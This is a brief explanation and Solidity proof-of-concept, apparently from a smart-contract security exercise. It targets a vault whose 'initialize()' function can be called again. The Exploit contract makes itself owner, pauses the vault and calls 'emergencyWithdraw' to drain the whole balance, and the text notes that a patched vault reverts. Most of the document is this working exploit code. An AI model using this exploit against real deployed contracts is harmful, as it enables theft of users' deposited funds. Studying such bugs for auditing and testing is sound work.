The bug is that `initialize()` never sets `_initialized = true`, so anyone can call it again and make themselves owner. The exploit re-initializes the vault, pauses it, and calls `emergencyWithdraw` to move the whole balance to itself. That leaves `totalDeposits` at 10 ether against a vault balance of 0. On a patched vault, the re-initialize call reverts, so the invariant still holds.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IInitVault {
    function initialize(address owner_, uint256 withdrawLimit_) external;
    function setPaused(bool paused_) external;
    function emergencyWithdraw(address payable to) external;
}

contract Exploit {
    IInitVault public vault;

    constructor(address target) payable {
        vault = IInitVault(target);
    }

    function run() external {
        vault.initialize(address(this), 5 ether);
        vault.setPaused(true);
        vault.emergencyWithdraw(payable(address(this)));
    }

    receive() external payable {}
}
```
